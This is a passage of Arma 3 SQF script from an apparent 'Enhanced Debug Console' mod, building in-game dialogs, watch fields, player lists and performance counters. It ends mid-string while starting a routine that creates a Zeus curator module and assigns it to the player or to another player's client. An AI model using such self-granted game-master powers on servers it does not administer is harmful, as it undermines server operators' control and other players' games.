                    _display_input = ctrlText EDC_ctrl_CPODisplay;
                };

                comment "----------------------";

                private _expressionHistory = profileNamespace getVariable["RscDebugConsole_expressionHistory", []];
                private _currentExpression = _expression_input;
                if (_expressionHistory isEqualTo[]) then {
                    profileNamespace setvariable["RscDebugConsole_expressionHistory", [_currentExpression]];
                    _expressionHistory = profileNamespace getVariable "RscDebugConsole_expressionHistory";
                };
                _parentDisplay setVariable["RscDebugConsole_expressionHistory_index", count _expressionHistory - 1];
                private _lastExpression = profileNamespace getVariable["RscDebugConsole_expression", ""];

                if (_lastExpression isEqualTo "" || _currentExpression isEqualTo _lastExpression) then {
                    _expressionHistory set[count _expressionHistory - 1, _currentExpression];
                }
                else {
                    if (_expressionHistory pushBack _currentExpression >= 10) then {
                        _expressionHistory deleteRange[0, count _expressionHistory - 10]
                    };
                };

                profileNamespace setVariable["RscDebugConsole_expression", _currentExpression];
                _parentDisplay setVariable["RscDebugConsole_expressionHistory_index", count _expressionHistory - 1];
                comment "saveProfileNamespace;";

                comment "----------------------------";

                _expression_input = [_expression_input] call EDC_fnc_commentCompatability;
                _arguments_input = [_arguments_input] call EDC_fnc_commentCompatability;
                _cycles_input = [_cycles_input] call EDC_fnc_commentCompatability;
                _display_input = [_display_input] call EDC_fnc_commentCompatability;

                _expression = _expression_input;
                _arguments = [] call(compile _arguments_input);
                _cycles = _cycles_input call BIS_fnc_parseNumber;
                _display = [] call(compile _display_input);

                with uiNameSpace do {
                    EDC_display_codePerformanceOptions closeDisplay 2;
                };

                [_expression, _arguments, _cycles, _display]
                call BIS_fnc_codePerformance;

                if (!(isNull(findDisplay 49))) then {
                    showChat false;
                    [] spawn {
                        waitUntil {
                            (isNull(findDisplay 49))
                        };
                        showChat true;
                    };
                };

            }];
            _ctrl_btnCPStart ctrlCommit 0;
        };
    };
    edc_fnc_initwatchresultloop = {
        private _watchValue1 = profileNamespace getVariable["RscDebugConsole_watch1", [true, "", false]];
        private _watchValue2 = profileNamespace getVariable["RscDebugConsole_watch2", [true, "", false]];
        private _watchValue3 = profileNamespace getVariable["RscDebugConsole_watch3", [true, "", false]];
        private _watchValue4 = profileNamespace getVariable["RscDebugConsole_watch4", [true, "", false]];
        private _watchText1 = "Not Evaluating";
        private _watchReturnStr1 = "N/A";
        private _watchText2 = "Not Evaluating";
        private _watchReturnStr2 = "N/A";
        private _watchText3 = "Not Evaluating";
        private _watchReturnStr3 = "N/A";
        private _watchText4 = "Not Evaluating";
        private _watchReturnStr4 = "N/A";
        private _watchCode1 = {};
        private _watchCode2 = {};
        private _watchCode3 = {};
        private _watchCode4 = {};
        if (EDC_showWatch1) then {
            _watchText1 = _watchValue1# 1;
            _watchCode1 = compile _watchText1;
        };
        if (EDC_showWatch2) then {
            _watchText2 = _watchValue2# 1;
            _watchCode2 = compile _watchText2;
        };
        if (EDC_showWatch3) then {
            _watchText3 = _watchValue3# 1;
            _watchCode3 = compile _watchText3;
        };
        if (EDC_showWatch4) then {
            _watchText4 = _watchValue4# 1;
            _watchCode4 = compile _watchText4;
        };
        _watchText1 = [_watchText1, 25] call EDC_fnc_limitChars;
        _watchText2 = [_watchText2, 25] call EDC_fnc_limitChars;
        _watchText3 = [_watchText3, 25] call EDC_fnc_limitChars;
        _watchText4 = [_watchText4, 25] call EDC_fnc_limitChars;
        private _hintStr =
        "<t align=''center'' color=''#FFFFFF'' font=''PuristaLight'' size=''1''>-------------------------------------------------------------------<br/>" +
        "<t align=''center'' font=''PuristaSemiBold'' shadow=''1'' color=''#FFFFFF'' size=''1.3''>[ Enhanced Debug Console ]<br/>" +
        "<t color=''#ffff00'' font=''PuristaMedium'' size=''1''>WATCHFIELD EXPRESSION RESULTS:<br/>" +
        "<t align=''center'' color=''#FFFFFF'' font=''PuristaLight'' size=''1''>-------------------------------------------------------------------<br/>" +
        "<t align=''left'' size=''1'' font=''puristaSemiBold'' color=''#ffff00''>1. <t align=''right'' size=''0.92'' font=''EtelkaMonospacePro'' color=''#00ff00''>%1<br/>" +
        "<t align=''left'' size=''1'' font=''puristaSemiBold'' color=''#ffff00''>= <t align=''right'' size=''0.92'' font=''EtelkaMonospacePro'' color=''#00c6ff''>%2<br/>" +
        "<t align=''center'' color=''#FFFFFF'' font=''PuristaLight'' size=''1''>-------------------------------------------------------------------<br/>" +
        "<t align=''left'' size=''1'' font=''puristaSemiBold'' color=''#ffff00''>2. <t align=''right'' size=''0.92'' font=''EtelkaMonospacePro'' color=''#00ff00''>%3<br/>" +
        "<t align=''left'' size=''1'' font=''puristaSemiBold'' color=''#ffff00''>= <t align=''right'' size=''0.92'' font=''EtelkaMonospacePro'' color=''#00c6ff''>%4<br/>" +
        "<t align=''center'' color=''#FFFFFF'' font=''PuristaLight'' size=''1''>-------------------------------------------------------------------<br/>" +
        "<t align=''left'' size=''1'' font=''puristaSemiBold'' color=''#ffff00''>3. <t align=''right'' size=''0.92'' font=''EtelkaMonospacePro'' color=''#00ff00''>%5<br/>" +
        "<t align=''left'' size=''1'' font=''puristaSemiBold'' color=''#ffff00''>= <t align=''right'' size=''0.92'' font=''EtelkaMonospacePro'' color=''#00c6ff''>%6<br/>" +
        "<t align=''center'' color=''#FFFFFF'' font=''PuristaLight'' size=''1''>-------------------------------------------------------------------<br/>" +
        "<t align=''left'' size=''1'' font=''puristaSemiBold'' color=''#ffff00''>4. <t align=''right'' size=''0.92'' font=''EtelkaMonospacePro'' color=''#00ff00''>%7<br/>" +
        "<t align=''left'' size=''1'' font=''puristaSemiBold'' color=''#ffff00''>= <t align=''right'' size=''0.92'' font=''EtelkaMonospacePro'' color=''#00c6ff''>%8<br/>" +
        "<t align=''center'' color=''#FFFFFF'' font=''PuristaLight'' size=''1''>-------------------------------------------------------------------<br/><t/>";
        while {
            isNull(findDisplay 49)
        }
        do EDC_fnc_evaluateExternalWatchfield;
        hintSilent '''';
    };
    edc_fnc_listplayers_gui = {
        with uiNamespace do {
            disableSerialization;
            comment "
                (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') cbSetChecked false;
            (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') ctrlCommit 0;
            (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') cbSetChecked true;
            (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') ctrlCommit 0;
            ";
            lbClear(uiNameSpace getVariable ''EDC_ctrl_targetLB'');
            (uiNameSpace getVariable ''EDC_ctrl_targetLB'') ctrlCommit 0;
            comment "_targetsArray = missionNamespace getVariable [''EDC_targetsArray'',[]];
            missionNamespace setVariable[''EDC_targetsArray'', _targetsArray];
            ";
            _allPlayers = [] call(missionNamespace getVariable[''EDC_fnc_listPlayers'', {}]);
            _allZeuses = [] call(missionNamespace getVariable[''EDC_fnc_listZeuses'', {}]); {
                _pictureColor = [side group _x, false] call BIS_fnc_sideColor;
                if ((isNil ''_pictureColor'') or(_pictureColor isEqualTo[])) then {
                    _pictureColor = [1, 1, 1, 1];
                };
                _pictureColor = [
                    (_pictureColor# 0) + 0.1,
                    (_pictureColor# 1) + 0.1,
                    (_pictureColor# 2) + 0.1,
                    1
                ];
                _textColor = [_pictureColor# 0, _pictureColor# 1, _pictureColor# 2, 1];
                _index = (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbAdd name _x;
                _x setVariable[''EDC_listIndex'', _index];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetValue[_index, _index];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetData[_index, getPlayerUID _x];


                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPicture[_index, ''\a3\ui_f\data\map\markers\handDrawn\unknown_CA.paa''];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureColor[_index, _pictureColor];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetColor[_index, _textColor];
                _isZeus = false;
                _isZeus_scripted = false;
                if (_x in _allZeuses) then {
                    _isZeus = true;
                } else {
                    if (!isNull(getAssignedCuratorLogic _x)) then {
                        _isZeus_scripted = true;
                    };
                };
                if (_isZeus) then {
                    _pictureColor = [0.9, 0.9, 0.9, 1];
                    _textColor = [0.8, 0.8, 0.8, 1];
                    (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPicture[_index, ''\a3\ui_f_curator\data\cfgdiary\playerLogic_ca.paa''];
                    (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureColor[_index, _pictureColor];
                    (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetColor[_index, _textColor];
                } else {
                    if (_isZeus_scripted) then {
                        _pictureColor = [0.9, 0.9, 0.9, 1];
                        (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPicture[_index, ''\A3\ui_f_curator\data\logos\arma3_curator_eye_64_ca.paa''];
                        (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureColor[_index, _pictureColor];
                        (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetColor[_index, _textColor];
                    } else {
                        (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPicture[_index, ''\a3\ui_f\data\map\VehicleIcons\iconMan_ca.paa''];
                        (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureColor[_index, _pictureColor];
                        (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetColor[_index, _textColor];
                    };
                };
                if ((!alive _x) or(damage _x == 1)) then {
                    (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureRight[_index, ''\a3\ui_f\data\map\Respawn\icon_dead_ca.paa''];
                    (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureRightColor[_index, [1, 1, 1, 1]];
                };

            }
            forEach _allPlayers;
            _placeHolders = [
                '''',
                ''''
            ]; {
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbAdd _x;
            }
            forEach _placeHolders;
            (uiNameSpace getVariable ''EDC_ctrl_targetLB'') ctrlCommit 0;
        };
    };
    edc_fnc_loadscript = {
        if (isNull(findDisplay 49)) exitWith {
            if (!isGamePaused) then {
                playSound[''addItemFailed'', true]
            }
        };
        with uiNamespace do {
            disableSerialization;


            EDC_display_loadScript = (findDisplay 49) createDisplay "RscDisplayEmpty";
            showChat true;
            _txtSize = safeZoneH * 0.5;

            _ctrl_title = EDC_display_loadScript ctrlCreate["RscStructuredText", -1];
            _ctrl_title ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.236 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.022 * safezoneH];
            _ctrl_title ctrlSetBackgroundColor[(profilenamespace getvariable[''GUI_BCG_RGB_R'', 0.13]), (profilenamespace getvariable[''GUI_BCG_RGB_G'', 0.54]), (profilenamespace getvariable[''GUI_BCG_RGB_B'', 0.21]), (profilenamespace getvariable[''GUI_BCG_RGB_A'', 0.8])];
            _ctrl_title ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Load Script</t>");
            _ctrl_title ctrlCommit 0;

            _ctrl_background = EDC_display_loadScript ctrlCreate["RscText", -1];
            _ctrl_background ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.269 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.44 * safezoneH];
            _ctrl_background ctrlSetBackgroundColor[0, 0, 0, 0.6];
            _ctrl_background ctrlCommit 0;

            _ctrl_titleScripts = EDC_display_loadScript ctrlCreate["RscStructuredText", -1];
            _ctrl_titleScripts ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.28 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
            _ctrl_titleScripts ctrlSetBackgroundColor[0, 0, 0, 0];
            _ctrl_titleScripts ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Scripts</t>");
            _ctrl_titleScripts ctrlCommit 0;

            _ctrl_titleSelected = EDC_display_loadScript ctrlCreate["RscStructuredText", -1];
            _ctrl_titleSelected ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.467 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
            _ctrl_titleSelected ctrlSetBackgroundColor[0, 0, 0, 0];
            _ctrl_titleSelected ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Selected</t>");
            _ctrl_titleSelected ctrlCommit 0;

            _buttonCancel = EDC_display_loadScript ctrlCreate["RscButtonMenu", -1];
            _buttonCancel ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
            _buttonCancel ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>CANCEL</t>");
            _buttonCancel ctrlSetTooltip ''Close'';
            _buttonCancel ctrlAddEventHandler["ButtonClick", {
                params["_control"];
                with uiNamespace do {
                    disableSerialization;
                    _parentDisplay = ctrlParent _control;
                    _parentDisplay closeDisplay 2;
                };
            }];
            _buttonCancel ctrlCommit 0;

            EDC_loadScript_ctrl_scriptName = EDC_display_loadScript ctrlCreate["RscEdit", -1];
            EDC_loadScript_ctrl_scriptName ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.5 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.033 * safezoneH];
            EDC_loadScript_ctrl_scriptName ctrlSetBackgroundColor[0, 0, 0, 0.5];
            EDC_loadScript_ctrl_scriptName ctrlSetText '''';
            EDC_loadScript_ctrl_scriptName ctrlCommit 0;

            EDC_loadScript_ctrl_scriptExpression = EDC_display_loadScript ctrlCreate["RscEditMulti", -1];
            EDC_loadScript_ctrl_scriptExpression ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.544 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.154 * safezoneH];
            EDC_loadScript_ctrl_scriptExpression ctrlSetBackgroundColor[0, 0, 0, 0.5];
            EDC_loadScript_ctrl_scriptExpression ctrlSetText '''';
            EDC_loadScript_ctrl_scriptExpression ctrlCommit 0;

            _savedScripts = profileNamespace getVariable[''EDC_savedScripts'', []];

            _ctrl_scripts = EDC_display_loadScript ctrlCreate["RscListBox", -1];
            uiNameSpace setVariable[''EDC_ctrl_savedScriptsList'', _ctrl_scripts];
            _ctrl_scripts ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.313 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.143 * safezoneH];
            _ctrl_scripts ctrlSetBackgroundColor[0, 0, 0, 0]; {
                _data = _x;
                _dataStr = _x;
                _dataStr = str _dataStr;
                _scriptName = _data select 0;
                _scriptExpression = _data select 1;
                _index = _ctrl_scripts lbAdd _dataStr;
                _ctrl_scripts lbSetPicture[_index, ''\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\documents_ca.paa''];
                _ctrl_scripts lbSetPictureColor[_index, [1, 1, 1, 1]];
                _ctrl_scripts lbSetData[_index, _dataStr];
            }
            forEach _savedScripts;
            _placeHolders = [
                '''',
                ''''
            ]; {
                _index = _ctrl_scripts lbAdd _x;
                _ctrl_scripts lbSetData[_index, "['''','''']"];
            }
            forEach _placeHolders;
            _ctrl_scripts ctrlAddEventHandler["LBSelChanged", {
                params["_control", "_selectedIndex"];
                _data = call compile(_control lbData _selectedIndex);
                _scriptName = _data select 0;
                _scriptExpression = _data select 1;
                with uiNameSpace do {
                    disableSerialization;
                    EDC_loadScript_ctrl_scriptName ctrlSetText _scriptName;
                    EDC_loadScript_ctrl_scriptExpression ctrlSetText _scriptExpression;
                };
            }];
            _ctrl_scripts ctrlCommit 0;
            _ctrl_scripts lbSetCurSel 0;

            _buttonLoad = EDC_display_loadScript ctrlCreate["RscButtonMenu", -1];
            _buttonLoad ctrlSetPosition[0.62375 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
            _buttonLoad ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>LOAD</t>");
            _buttonLoad ctrlAddEventHandler["ButtonClick", {
                params["_control"];
                [_control] spawn {
                    params["_control"];
                    with uiNamespace do {
                        disableSerialization;
                        _parentDisplay = ctrlParent _control;
                        _scriptExpression = ctrlText EDC_loadScript_ctrl_scriptExpression;
                        if (_scriptExpression == '''') exitWith {
                            systemChat ''Error : Selected script is blank.'';
                            if (!isGamePaused) then {
                                playSound[''addItemFailed'', true];
                            };
                        };
                        _parentDisplay closeDisplay 2;
                        waitUntil {
                            (!isNull findDisplay 49)
                        };
                        if (!isNil ''EDC_expression'') then {
                            if (!isNull EDC_expression) then {
                                EDC_expression ctrlSetText _scriptExpression;
                                profileNamespace setVariable["RscDebugConsole_expression", _scriptExpression];
                                if (!isGamePaused) then {
                                    playSound[''addItemOK'', true];
                                };
                            };
                        };
                    };
                };
            }];
            _buttonLoad ctrlCommit 0;

            _buttonDelete = EDC_display_loadScript ctrlCreate["RscButtonMenu", -1];
            _buttonDelete ctrlSetPosition[0.381406 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
            _buttonDelete ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>DELETE</t>");
            _buttonDelete ctrlAddEventHandler["ButtonClick", {
                params["_control"];
                with uiNamespace do {
                    disableSerialization;
                    _savedScripts1 = profileNamespace getVariable[''EDC_savedScripts'', []];
                    _savedScripts2 = profileNamespace getVariable[''EDC_savedScripts'', []];
                    _ctrl_scripts = uiNameSpace getVariable ''EDC_ctrl_savedScriptsList'';
                    _selectedIndex = lbCurSel _ctrl_scripts;
                    _thisData = call compile(_ctrl_scripts lbData _selectedIndex);
                    _thisScriptName = _thisData# 0; {
                        if (_x isEqualTo _thisData) exitWith {
                            _savedScripts1 deleteAt _forEachIndex;
                            profileNamespace setVariable[''EDC_savedScripts'', _savedScripts1];
                            saveProfileNamespace;
                            if (!isGamePaused) then {
                                playSound[''addItemOK'', true];
                            };
                            systemChat format[''Script %1 deleted from profile'', _thisScriptName];
                        };
                    }
                    forEach _savedScripts2;
                    lbClear _ctrl_scripts;
                    _ctrl_scripts ctrlCommit 0;
                    _savedScripts = profileNamespace getVariable[''EDC_savedScripts'', []]; {
                        _data = _x;
                        _dataStr = _x;
                        _dataStr = str _dataStr;
                        _scriptName = _data select 0;
                        _scriptExpression = _data select 1;
                        _index = _ctrl_scripts lbAdd _dataStr;
                        _ctrl_scripts lbSetPicture[_index, ''\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\documents_ca.paa''];
                        _ctrl_scripts lbSetPictureColor[_index, [1, 1, 1, 1]];
                        _ctrl_scripts lbSetData[_index, _dataStr];
                    }
                    forEach _savedScripts;
                    _placeHolders = [
                        '''',
                        ''''
                    ]; {
                        _index = _ctrl_scripts lbAdd _x;
                        _ctrl_scripts lbSetData[_index, "['''','''']"];
                    }
                    forEach _placeHolders;
                    _ctrl_scripts ctrlCommit 0;
                    _ctrl_scripts lbSetCurSel _selectedIndex;
                };
            }];
            _buttonDelete ctrlCommit 0;
        };
    };
    edc_fnc_updateaveragefps = {
        if (missionnamespace getVariable[''EDC_avgFPS_pinging'', false]) exitWith {};

        EDC_avgFPS_pinging = true;



        with uinamespace do {
            EDC_PerfMetAvgFPS ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Mean FPS<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetAvgFPS ctrlCommit 0;
        };

        _allPlayers = allPlayers;
        _playerCount = count _allPlayers;

        EDC_avgFPS_returnCount = 0;
        EDC_avgFPS_values = [];

        {
            [
                [], {
                    _this call(EDC_REfnc# 3);
                }
            ] remoteExec[''call'', _x];
        }
        forEach _allPlayers;

        _playerCount spawn {
            waitUntil {
                uiSleep 0.1;
                (EDC_avgFPS_returnCount == _this)
            };

            EDC_avgFPS_total = 0;

            {
                EDC_avgFPS_total = EDC_avgFPS_total + _x;
            }
            forEach EDC_avgFPS_values;

            _avgFPS = floor(EDC_avgFPS_total / _this);

            with uinamespace do {
                EDC_PerfMetAvgFPS ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Mean FPS<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, _avgFPS, 1.05 * EDC_textSize];
                EDC_PerfMetAvgFPS ctrlCommit 0;
            };

            EDC_avgFPS_pinging = false;
        };
    };
    edc_fnc_highlightobjects = {
        EDC_highlighedObjects = _this;
        [EDC_highlighedObjects, [0, 1, 1, 1], true] call BIS_fnc_drawBoundingBox;
        if (!isNil ''EDC_EH_highlightObj'') then {
            removeMissionEventHandler[''Draw3D'', EDC_EH_highlightObj];
        };
        EDC_EH_highlightObj = addMissionEventHandler["Draw3D", {
            private _obj1 = vehicle player;
            private _pos1 = (_obj1) modelToWorldVisual(_obj1 selectionPosition ''spine3''); {
                private _obj2 = _x;
                _pos2 = (_obj2) modelToWorldVisual(_obj2 selectionPosition ''spine3'');
                drawLine3D[_pos1, _pos2, [1, 1, 0, 1]];
            }
            forEach EDC_highlighedObjects;
        }];
    };
    edc_fnc_gamepausedevent = {
        0 = [] spawn EDC_fnc_spawnDebugConsole;
    };
    edc_fnc_updateobjcount = {
        with uinamespace do {
            EDC_PerfMetObjCount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Object Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetObjCount ctrlCommit 0;
            EDC_PerfMetObjCount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  Object Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, count(allMissionObjects ''''), 1.05 * EDC_textSize];
            EDC_PerfMetObjCount ctrlCommit 0;
        };
    };
    edc_fnc_openzeus = {
        if (isNull(getAssignedCuratorLogic player)) then {
            [] call EDC_fnc_initZeusInterface;
            comment "NOT NEEDED ANYMORE:
            _openZeus = [] spawn {
                waitUntil {
                    (!isNull(getAssignedCuratorLogic player))
                };
                openCuratorInterface;
            };
            ";
        } else {
            openCuratorInterface;
        };


    };
    edc_fnc_listai_gui = {
        with uiNamespace do {
            disableSerialization;

            lbClear(uiNameSpace getVariable ''EDC_ctrl_targetLB'');
            (uiNameSpace getVariable ''EDC_ctrl_targetLB'') ctrlCommit 0;

            {

                _pictureColor = [side group _x, false] call BIS_fnc_sideColor;
                if ((isNil ''_pictureColor'') or(_pictureColor isEqualTo[])) then {
                    _pictureColor = [1, 1, 1, 1];
                };

                _pictureColor = [
                    (_pictureColor# 0) + 0.1,
                    (_pictureColor# 1) + 0.1,
                    (_pictureColor# 2) + 0.1,
                    1
                ];

                _textColor = [_pictureColor# 0, _pictureColor# 1, _pictureColor# 2, 1];

                _name = name _x;
                _nameDisplay = _name + " (AI)";

                _index = (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbAdd _nameDisplay;
                _x setVariable[''EDC_listIndex'', _index];


                comment "(uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPicture [_index, ''\a3\ui_f\data\map\markers\handDrawn\unknown_CA.paa''];
                    (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureColor[_index, _pictureColor];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetColor[_index, _textColor];
                ";

                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPicture[_index, ''\a3\ui_f\data\map\VehicleIcons\iconManVirtual_ca.paa''];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureColor[_index, _pictureColor];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetColor[_index, _textColor];

                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetData[_index, _name];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetValue[_index, _index];


                if ((!alive _x) or(damage _x == 1)) then {
                    (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureRight[_index, ''\a3\ui_f\data\map\Respawn\icon_dead_ca.paa''];
                    (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureRightColor[_index, [1, 1, 1, 1]];
                };
            }
            forEach(allUnits - allPlayers);

            private _agents = []; {
                if (isAgent(teamMember _x)) then {
                    _agents pushBack _x;
                };
            }
            forEach entities ''man''; {
                _pictureColor = [0.8, 0.8, 0, 0.9];
                _textColor = _pictureColor;
                _name = name _x;
                _nameDisplay = _name + " (Agent)";
                _index = (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbAdd _nameDisplay;
                _x setVariable[''EDC_listIndex'', _index];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetData[_index, _name];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetValue[_index, _index];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPicture[_index, ''\a3\ui_f\data\map\VehicleIcons\iconManVirtual_ca.paa''];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetPictureColor[_index, _pictureColor];
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbSetColor[_index, _textColor];
            }
            forEach _agents;

            _placeHolders = [
                '''',
                ''''
            ]; {
                (uiNameSpace getVariable ''EDC_ctrl_targetLB'') lbAdd _x;
            }
            forEach _placeHolders;
            (uiNameSpace getVariable ''EDC_ctrl_targetLB'') ctrlCommit 0;
        };
    };
    edc_fnc_updateaicount = {
        with uinamespace do {
            EDC_PerfMetAICount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  AI Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, ''...'', 1.05 * EDC_textSize];
            EDC_PerfMetAICount ctrlCommit 0;
            EDC_PerfMetAICount ctrlSetStructuredText parseText format["<t align=''left'' font=''RobotoCondensed'' shadow=''2'' color=''#FFFFFF'' size=''%1''>  AI Count<t align=''center''><t align=''right'' font=''EtelkaMonospacePro'' size=''%3''>%2 <t/>", 0.95 * EDC_textSize, count(agents + (allUnits - allPlayers)), 1.05 * EDC_textSize];
            EDC_PerfMetAICount ctrlCommit 0;
        };

    };
    edc_fnc_initcustomkeybinds = {
        if (!isNil "EDC_keybind_stealTargetLoadout") then {
            (findDisplay 46) displayRemoveEventHandler["keyDown", EDC_keybind_stealTargetLoadout];
        };

        EDC_keybind_stealTargetLoadout = (findDisplay 46) displayAddEventHandler["KeyDown", {
            params["_displayorcontrol", "_key", "_shift", "_ctrl", "_alt"];
            comment "487784463";
            private _tabKey = 15;
            if (_ctrl && (_key == _tabKey)) then {
                private _unit1 = objNull;
                _unit1 = cursorTarget;
                if ((isNull _unit1) or(isNil {
                        _unit1
                    })) then {
                    _unit1 = cursorObject;
                };
                if ((isNull _unit1) or(isNil {
                        _unit1
                    })) exitWith {};
                private _unit2 = player;
                [_unit1, _unit2] call EDC_fnc_copyLoadout;
            };
        }];
        comment "Key: LCTRL + TAB";

    };
    edc_fnc_initzeusinterface = { 
    
    
    
        EDC_fnc_giveZeus = { 
    
    
    
            _giveZeus = { 
                waitUntil { 
                    alive player 
                }; 
                if (!isNull(getAssignedCuratorLogic player)) exitWith { 
                    if (!isGamePaused) then { 
                        playSOund ''AddItemFailed''; 
                    }; 
                    systemChat ''[ Enhanced Debug Console] : Cannot assign curator (you already have a zeus logic module).''; 
                }; 
                systemChat ''[ Enhanced Debug Console ] : Assigning curator...''; 
                waitUntil {(alive player)};  
                comment "Script Title:  
                Create and Assign New Zeus (Curator Creator).  
                ";  
                comment "Credits:  
                Created by J [WoLF].  
                ";  
                comment "Description:  
                - Creates new unique zeus module for each client it is run on.  
                - Assigns zeus to the client it executed run on.  
                - Automatically updates zeus interface with new objects.  
                - Re-assigns zeus to player every respawn.  
                ";  
                comment "Usage:  
                - Copy entire script. Paste in debug console.  
                - Execute on local client to make yourself zeus.  
                - Execute on another player''s client to give them zeus interface.  
                - Press [Y] to open and close the zeus interface.  
                ";  
                _init_createZeusModules = [] spawn {  
                sKAM_addZeus_vehicleVarName = vehicleVarName player;  
                sKAM_addZeus_superCuratorVar = ("" + sKAM_addZeus_vehicleVarName + "_superCurator");  
                sKAM_addZeus_CuratorLogicGroupVar = ("" + sKAM_addZeus_vehicleVarName + "_CuratorLogicGroup");  
                sKAM_addZeus_superCuratorPlayerAttributesVar = ("" + sKAM_addZeus_vehicleVarName + "_superCuratorPlayerAttributes");  
                sKAM_addZeus_initText = ("" +   
                sKAM_addZeus_CuratorLogicGroupVar + " = createGroup sideLogic;" +   
                sKAM_addZeus_superCuratorVar + " = " + sKAM_addZeus_CuratorLogicGroupVar + " createUnit [''ModuleCurator_F'', [0, 90, 90],[],0.5,''NONE''];" +   
                sKAM_addZeus_superCuratorVar + " setVehicleVarName ''" + sKAM_addZeus_superCuratorVar + "'';" +   
